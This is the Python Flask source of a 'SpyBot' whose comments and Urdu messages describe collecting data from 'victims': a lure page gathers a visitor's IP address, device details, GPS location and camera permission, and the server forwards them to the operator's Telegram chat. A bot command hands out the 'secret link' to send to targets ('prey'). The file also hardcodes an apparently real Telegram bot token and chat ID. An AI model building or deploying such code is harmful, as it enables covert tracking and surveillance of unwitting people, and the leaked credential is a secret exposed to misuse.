from flask import Flask, request, render_template
import requests
import os

app = Flask(__name__)

# === Telegram Configuration ===
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg")
CHAT_ID = os.environ.get("CHAT_ID", "6908281054")
WEB_URL = "https://faizan-spybot.onrender.com"

# === Homepage ===
@app.route('/')
def index():
    return render_template("spy.html")

# === Data Collection from Victim ===
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    camera_status = data.get("camera", "❌ Not Granted")

    map_link = f"https://maps.google.com/?q={latitude},{longitude}" if latitude and longitude else "Not available"

    message = f"""👁️ شکار آیا!
🌐 IP: {ip}
📱 Device: {user_agent}
📍 Location: {map_link}
📷 Camera: {camera_status}
🧠 Raw: {data}
"""

    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(telegram_url, data=payload)

    return "OK", 200

# === Telegram Bot Handler ===
@app.route(f'/{BOT_TOKEN}', methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        text = update["message"].get("text", "")
        if text == "/start":
            welcome = f"""👋 خوش آمدید فیضانؔ مغل کے SpyBot میں!

🔗 آپ کا خفیہ لنک:
{WEB_URL}

📌 لنک کو کسی پر بھیج کر شکار کا انتظار کریں۔
"""
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {'chat_id': chat_id, 'text': welcome}
            requests.post(url, data=payload)
    return "OK", 200

# === Run Server ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
